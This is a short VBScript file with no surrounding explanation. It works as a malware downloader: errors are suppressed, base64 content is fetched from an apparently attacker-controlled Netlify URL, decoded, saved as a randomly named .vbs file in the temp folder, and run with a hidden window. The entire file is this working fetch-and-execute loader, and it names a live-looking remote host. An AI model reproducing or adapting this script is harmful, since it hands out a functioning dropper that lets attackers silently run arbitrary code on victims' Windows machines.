
On Error Resume Next
Dim http, base64data, stream, tempFile, fso
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", "https://resonant-moonbeam-a375e2.netlify.app/pHS/done.txt", False
http.Send
If http.Status = 200 Then
    base64data = http.responseText

    Dim byteData
    byteData = Base64Decode(base64data)

    Set fso = CreateObject("Scripting.FileSystemObject")
    tempFile = fso.GetSpecialFolder(2) & "\" & fso.GetTempName() & ".vbs"

    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write byteData
    stream.SaveToFile tempFile, 2
    stream.Close

    CreateObject("WScript.Shell").Run tempFile, 0, False
End If

Function Base64Decode(ByVal base64String)
    Dim xml, node
    Set xml = CreateObject("Microsoft.XMLDOM")
    Set node = xml.createElement("base64")
    node.dataType = "bin.base64"
    node.Text = base64String
    Base64Decode = node.nodeTypedValue
End Function
